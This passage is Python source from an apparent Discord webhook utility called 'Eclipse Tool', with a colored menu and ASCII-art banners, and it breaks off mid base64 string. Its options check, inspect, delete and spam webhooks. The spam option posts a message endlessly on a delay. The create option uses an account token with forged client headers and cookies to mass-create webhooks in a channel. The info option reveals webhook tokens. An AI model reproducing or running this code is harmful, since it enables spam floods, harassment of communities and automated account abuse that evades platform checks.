▓█░ █ ░█░▓█   ▀ ▓█████▄ ▒▓██░ ██ ▒██▒  ██▒▒██▒  ██▒  ██▄█▒     ▓██ ▒ ██▒▒████▄   ▒▓██ ▒██▀ ██▌▓█   ▀▓██ ▒ ██▓
▒█░ █ ░█ ▒███   ▒██▒ ▄██░▒██▀▀██ ▒██░  ██▒▒██░  ██▒ ▓███▄░     ▓██ ░▄█ ▒▒██  ▀█▄ ░▒██ ░██   █▌▒███  ▓██ ░▄█ ▒
░█░ █ ░█ ▒▓█  ▄ ▒██░█▀   ░▓█ ░██ ▒██   ██░▒██   ██░ ▓██ █▄     ▒██▀▀█▄  ░██▄▄▄▄██ ░██▒░▓█▄   ▌▒▓█  ▄▒██▀▀█▄  
░░██▒██▓ ░▒████▒░▓█  ▀█▓ ░▓█▒░██▓░ ████▓▒░░ ████▓▒░ ▒██▒ █▄    ░██▓ ▒██▒ ▓█   ▓██ ░██░░▒████▓ ░▒████░██▓ ▒██▒
░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒  ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ▒▒ ▓▒    ░ ▒▓ ░▒▓░ ▒▒   ▓▒█ ░▓ ░ ▒▒▓  ▒ ░░ ▒░ ░ ▒▓ ░▒▓░
  ▒ ░ ░   ░ ░  ░▒░▒   ░   ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ░▒ ▒░      ░▒ ░ ▒░  ░   ▒▒   ▒   ░ ▒  ▒  ░ ░    ░▒ ░ ▒░
  ░   ░     ░    ░    ░   ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░░ ░        ░   ░   ░   ▒    ▒   ░ ░  ░    ░     ░   ░ 
    ░       ░  ░ ░        ░  ░  ░    ░ ░      ░ ░   ░  ░          ░           ░    ░     ░       ░     ░     



  {Fore.RED}[{Fore.YELLOW}01{Fore.RED}] {Fore.YELLOW}CHECK WEBHOOK
  {Fore.RED}[{Fore.YELLOW}02{Fore.RED}] {Fore.YELLOW}WEBHOOK INFO
  {Fore.RED}[{Fore.YELLOW}03{Fore.RED}] {Fore.YELLOW}DELETE WEBHOOK
  {Fore.RED}[{Fore.YELLOW}04{Fore.RED}] {Fore.YELLOW}SPAM WEBHOOK
  {Fore.RED}[{Fore.YELLOW}05{Fore.RED}] {Fore.YELLOW}CREATE WEBHOOKS
  {Fore.RED}[{Fore.YELLOW}06{Fore.RED}] {Fore.YELLOW}CREATE + SPAM WEBHOOKS
  {Fore.RED}[{Fore.YELLOW}00{Fore.RED}] EXIT

    {Fore.RED}[{Fore.YELLOW}>{Fore.RED}]{Fore.YELLOW}''')


    if options2 in ['1','01']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Webhook Checker")
      hookcheck = print(f'''
{Fore.RED}
 █     █░▓█████  ▄▄▄▄     ██░ ██  ▒█████   ▒█████   ▀██ ▄█▀     ▄████▄   ██░ ██ ▓█████ ▀██ ▄█▀▓█████ ██▀███  
▓█░ █ ░█░▓█   ▀ ▓█████▄ ▒▓██░ ██ ▒██▒  ██▒▒██▒  ██▒  ██▄█▒     ▒██▀ ▀█ ▒▓██░ ██ ▓█   ▀  ██▄█▒ ▓█   ▀▓██ ▒ ██▒
▒█░ █ ░█ ▒███   ▒██▒ ▄██░▒██▀▀██ ▒██░  ██▒▒██░  ██▒ ▓███▄░     ▒▓█    ▄░▒██▀▀██ ▒███   ▓███▄░ ▒███  ▓██ ░▄█ ▒
░█░ █ ░█ ▒▓█  ▄ ▒██░█▀   ░▓█ ░██ ▒██   ██░▒██   ██░ ▓██ █▄     ▒▓▓▄ ▄██ ░▓█ ░██ ▒▓█  ▄ ▓██ █▄ ▒▓█  ▄▒██▀▀█▄  
░░██▒██▓ ░▒████▒░▓█  ▀█▓ ░▓█▒░██▓░ ████▓▒░░ ████▓▒░ ▒██▒ █▄    ▒ ▓███▀  ░▓█▒░██▓░▒████ ▒██▒ █▄░▒████░██▓ ▒██▒
░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒  ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ▒▒ ▓▒    ░ ░▒ ▒    ▒ ░░▒░▒░░ ▒░  ▒ ▒▒ ▓▒░░ ▒░ ░ ▒▓ ░▒▓░
  ▒ ░ ░   ░ ░  ░▒░▒   ░   ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ░▒ ▒░      ░  ▒    ▒ ░▒░ ░ ░ ░   ░ ░▒ ▒░ ░ ░    ░▒ ░ ▒░
  ░   ░     ░    ░    ░   ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░░ ░     ░         ░  ░░ ░   ░   ░ ░░ ░    ░     ░   ░ 
    ░       ░  ░ ░        ░  ░  ░    ░ ░      ░ ░   ░  ░       ░ ░       ░  ░  ░   ░   ░  ░      ░     ░     


      ''')

      hookcheck = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is your webhook link?: ''')
      r = requests.get(hookcheck)
      if r.status_code == 200:
        print("Valid Webhook Link!")
      else:
        print("Webhook Link Not Valid!")

    elif options2 in ['2','02']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Webhook Information")
      options3 = print(f'''
      {Fore.RED}
 █     █░▓█████  ▄▄▄▄     ██░ ██  ▒█████   ▒█████   ▀██ ▄█▀      ██ ███▄    █    █████ ▒█████  
▓█░ █ ░█░▓█   ▀ ▓█████▄ ▒▓██░ ██ ▒██▒  ██▒▒██▒  ██▒  ██▄█▒     ▒▓██ ██ ▀█   █  ▓██    ▒██▒  ██▒
▒█░ █ ░█ ▒███   ▒██▒ ▄██░▒██▀▀██ ▒██░  ██▒▒██░  ██▒ ▓███▄░     ░▒██▓██  ▀█ ██▒ ▒████  ▒██░  ██▒
░█░ █ ░█ ▒▓█  ▄ ▒██░█▀   ░▓█ ░██ ▒██   ██░▒██   ██░ ▓██ █▄      ░██▓██▒  ▐▌██▒ ░▓█▒   ▒██   ██░
░░██▒██▓ ░▒████▒░▓█  ▀█▓ ░▓█▒░██▓░ ████▓▒░░ ████▓▒░ ▒██▒ █▄     ░██▒██░   ▓██░▒░▒█░   ░ ████▓▒░
░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒  ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ▒▒ ▓▒     ░▓ ░ ▒░   ▒ ▒ ░ ▒ ░   ░ ▒░▒░▒░ 
  ▒ ░ ░   ░ ░  ░▒░▒   ░   ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ░▒ ▒░      ▒ ░ ░░   ░ ▒░░ ░       ░ ▒ ▒░ 
  ░   ░     ░    ░    ░   ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░░ ░       ▒    ░   ░ ░   ░ ░   ░ ░ ░ ▒  
    ░       ░  ░ ░        ░  ░  ░    ░ ░      ░ ░   ░  ░         ░          ░ ░           ░ ░  

            ''')

      options3 = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is your webhook link?: ''')
      print(Fore.RESET)
      r = requests.get(options3)
      print(f'{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Webhook Name: {Fore.YELLOW}{r.json()["name"]}')
      print(f'{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Webhook ID: {Fore.YELLOW}{r.json()["id"]}')
      print(f'{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Guild ID of Webhook: {Fore.YELLOW}{r.json()["guild_id"]}')
      print(f'{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Channel ID of Webhook: {Fore.YELLOW}{r.json()["channel_id"]}')
      if r.json()['avatar'] == 'null':
          print(f'{Fore.RESET}Avatar: {Fore.YELLOW} None')
      else:
          avatar = f'https://cdn.discordapp.com/avatars/{r.json()["id"]}/{r.json()["avatar"]}'
          print(f'{Fore.RESET}Avatar: {Fore.YELLOW}{avatar}')
      print(f'{Fore.RESET}Token of Webhook :{Fore.YELLOW}{r.json()["token"]}')


    elif options2 in ['3','03']: 
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Webhook Deleter")
      print(f'''
  {Fore.RED}
 █     █░▓█████  ▄▄▄▄     ██░ ██  ▒█████   ▒█████   ▀██ ▄█▀     ▓█████▄ ▓█████ ██▓   ▓█████▄▄▄█████▓▓█████ ██▀███  
▓█░ █ ░█░▓█   ▀ ▓█████▄ ▒▓██░ ██ ▒██▒  ██▒▒██▒  ██▒  ██▄█▒      ▒██▀ ██▌▓█   ▀▓██▒   ▓█   ▀▓  ██▒ ▓▒▓█   ▀▓██ ▒ ██▒
▒█░ █ ░█ ▒███   ▒██▒ ▄██░▒██▀▀██ ▒██░  ██▒▒██░  ██▒ ▓███▄░      ░██   █▌▒███  ▒██░   ▒███  ▒ ▓██░ ▒░▒███  ▓██ ░▄█ ▒
░█░ █ ░█ ▒▓█  ▄ ▒██░█▀   ░▓█ ░██ ▒██   ██░▒██   ██░ ▓██ █▄     ▒░▓█▄   ▌▒▓█  ▄▒██░   ▒▓█  ▄░ ▓██▓ ░ ▒▓█  ▄▒██▀▀█▄  
░░██▒██▓ ░▒████▒░▓█  ▀█▓ ░▓█▒░██▓░ ████▓▒░░ ████▓▒░ ▒██▒ █▄    ░░▒████▓ ░▒████░██████░▒████  ▒██▒ ░ ░▒████░██▓ ▒██▒
░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒  ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ▒▒ ▓▒    ░ ▒▒▓  ▒ ░░ ▒░ ░ ▒░▓  ░░ ▒░   ▒ ░░   ░░ ▒░ ░ ▒▓ ░▒▓░
  ▒ ░ ░   ░ ░  ░▒░▒   ░   ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ░▒ ▒░      ░ ▒  ▒  ░ ░  ░ ░ ▒   ░ ░      ░     ░ ░    ░▒ ░ ▒░
  ░   ░     ░    ░    ░   ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░░ ░       ░ ░  ░    ░    ░ ░     ░    ░ ░       ░     ░   ░ 
    ░       ░  ░ ░        ░  ░  ░    ░ ░      ░ ░   ░  ░           ░       ░      ░     ░              ░     ░     


      ''')  
      web = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Webhook Link: ''')
      try:
        requests.delete(web)
        print("Webhook successfully deleted")
      except:
        print("Error deleting webhook")

    elif options2 in ['4','04']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Webhook Spammer")
      print(f"""
  {Fore.RED}
  ██████  ██▓███   ▄▄▄       ███▄ ▄███▓  ███▄ ▄███▓▓█████ ██▀███  
▒██    ▒ ▓██░  ██ ▒████▄    ▓██▒▀█▀ ██▒ ▓██▒▀█▀ ██▒▓█   ▀▓██ ▒ ██▒
░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░ ▓██    ▓██░▒███  ▓██ ░▄█ ▒
  ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██  ▒██    ▒██ ▒▓█  ▄▒██▀▀█▄  
▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒▒██▒   ░██▒░▒████░██▓ ▒██▒
▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░   ░  ░░░ ▒░ ░ ▒▓ ░▒▓░
░ ░▒  ░  ░▒ ░       ░   ▒▒ ░░  ░      ░░░  ░      ░ ░ ░    ░▒ ░ ▒░
░  ░  ░  ░░         ░   ▒   ░      ░    ░      ░      ░     ░   ░ 
      ░                 ░  ░       ░   ░       ░      ░     ░     


      """)

      webhook = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Webhook Link: ''')
      message = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Message: ''')
      delay = float(input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Delay: '''))

      while True:
        try:
          time.sleep(delay)
          data = requests.post(webhook, json={'content': message})

          if data.status_code == 204:
            print(f"{message} sent!")
        except:
          print("Error, or wrong webhook: {}".format(webhook))
          time.sleep(delay)

    elif options2 in ['5','05']:  
        cls()
        ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Webhook Creator")
        print(f'''
{Fore.RED}
 █     █░▓█████  ▄▄▄▄     ██░ ██  ▒█████   ▒█████   ▀██ ▄█▀     ▄████▄  ██▀███  ▓█████ ▄▄▄     ▄▄▄█████▓ ▒█████   ██▀███  
▓█░ █ ░█░▓█   ▀ ▓█████▄ ▒▓██░ ██ ▒██▒  ██▒▒██▒  ██▒  ██▄█▒     ▒██▀ ▀█ ▓██ ▒ ██▒▓█   ▀▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒
▒█░ █ ░█ ▒███   ▒██▒ ▄██░▒██▀▀██ ▒██░  ██▒▒██░  ██▒ ▓███▄░     ▒▓█    ▄▓██ ░▄█ ▒▒███  ▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒
░█░ █ ░█ ▒▓█  ▄ ▒██░█▀   ░▓█ ░██ ▒██   ██░▒██   ██░ ▓██ █▄     ▒▓▓▄ ▄██▒██▀▀█▄  ▒▓█  ▄░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  
░░██▒██▓ ░▒████▒░▓█  ▀█▓ ░▓█▒░██▓░ ████▓▒░░ ████▓▒░ ▒██▒ █▄    ▒ ▓███▀ ░██▓ ▒██▒░▒████ ▓█   ▓██  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒
░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒  ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ▒▒ ▓▒    ░ ░▒ ▒  ░ ▒▓ ░▒▓░░░ ▒░  ▒▒   ▓▒█  ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
  ▒ ░ ░   ░ ░  ░▒░▒   ░   ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ░▒ ▒░      ░  ▒    ░▒ ░ ▒░ ░ ░    ░   ▒▒     ░      ░ ▒ ▒░   ░▒ ░ ▒░
  ░   ░     ░    ░    ░   ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░░ ░     ░          ░   ░    ░    ░   ▒    ░ ░    ░ ░ ░ ▒     ░   ░ 
    ░       ░  ░ ░        ░  ░  ░    ░ ░      ░ ░   ░  ░       ░ ░        ░        ░        ░               ░ ░     ░     



        ''')

        chanid = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the channel id you want to make the webhooks in?: ''')
        tukan4 = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the token to use?: ''')

        print("Starting Now...")

        def spammer():

            url = f'https://discord.com/api/v9/channels/{chanid}/webhooks'

            global randstr

            def randstr(lenn):
                alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
                text = ''
                for i in range(0, lenn):
                    text += alpha[random.randint(0, len(alpha) - 1)]
                return text


            header = {
                "authority": "discord.com",
                "method": "POST",
                "path": f"/api/v9/channels/{chanid}/webhooks",
                "scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "Authorization": f'{tukan4}',
                "content-length": "0",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                'referer': 'https://discord.com/channels/@me',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": useragent(),
                "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            }




            url2 = "data:image/jpg;base64,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